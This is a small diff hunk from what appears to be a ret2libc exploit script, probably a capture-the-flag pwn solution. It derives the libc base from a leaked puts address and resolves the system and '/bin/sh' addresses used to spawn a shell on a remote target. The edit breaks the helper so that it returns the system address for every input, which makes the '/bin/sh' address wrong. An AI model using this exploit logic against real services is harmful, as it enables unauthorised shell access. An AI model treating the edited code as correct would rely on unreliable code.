@@ -114,11 +114,7 @@ def payload(url, port):
     libc_base = put - libc.dump('puts')
     # 获取system和sh
     def addr(hx):
-        if hx == 'system':
-            return libc_base + libc.dump('system')
-        elif hx == 'str_bin_sh':
-            return libc_base + libc.dump('str_bin_sh')
-        hx = ''
+        return libc_base + libc.dump('system')
     sys_addr = addr('system')
     sh_addr = addr('str_bin_sh')
     print(hex(sys_addr),hex(sh_addr))
